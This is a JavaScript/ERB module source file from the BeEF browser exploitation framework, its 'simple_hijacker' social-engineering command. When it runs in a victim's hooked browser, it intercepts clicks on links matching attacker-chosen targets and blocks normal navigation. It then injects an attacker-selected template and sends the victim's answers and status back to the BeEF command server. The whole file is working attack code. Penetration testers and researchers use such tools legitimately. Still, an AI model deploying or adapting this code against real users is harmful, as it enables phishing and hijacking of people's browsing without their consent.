//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


hijack = function(){
    function send(answer){
      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);	
    }
    <% target = @targets.split(',') %>   
    $j('a').click(function(e) {
      e.preventDefault();
      if ($j(this).attr('href') != '')
      { 
        if( <% target.each{ |href| %> $j(this).attr('href').indexOf("<%=href%>") != -1 <% if href != target.last %> || <% else %> ) <% end %><% } %>{			
          <%
              tplpath = "#{$root_dir}/modules/social_engineering/simple_hijacker/templates/#{@choosetmpl}.js"
              file = File.open(tplpath, "r")
              @template = file.read
          %>
          
          <%= @template %>
          beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Template "<%= @choosetmpl %>" applied to '+$j(this).attr('href'));
        }
      }
    });
}

beef.execute(function() {
	hijack();
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Hijacker ready, now waits for user action');
});
